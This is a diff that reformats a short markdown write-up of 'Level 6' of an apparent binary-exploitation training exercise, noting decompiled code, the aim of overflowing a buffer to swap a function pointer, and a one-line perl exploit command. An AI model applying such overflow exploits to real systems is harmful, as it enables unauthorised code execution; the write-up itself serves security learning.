@@ -1,8 +1,8 @@
 # Level 6
 
-## the code:
+## The Code:
 
-decompiled with Hex-Rays (https://dogbolt.org/)
+- Decompiled with Hex-Rays ([dogbolt.com](https://dogbolt.org/))
 
 ```c
 //----- (08048454) --------------------------------------------------------
@@ -31,12 +31,13 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-## the goal:
+## The Goal:
 
-replace m() by n() in v4. Therefore we will overflow v5.
+- Replace `m()` by `n()` in `v4`.
+- For this we will overflow `v5`.
 
-## the hack:
+## The Hack:
 
-```sh
+```console
 $ ./level6 $(perl -e 'print"\x54\x84\x04\x08" x 19')
 ```
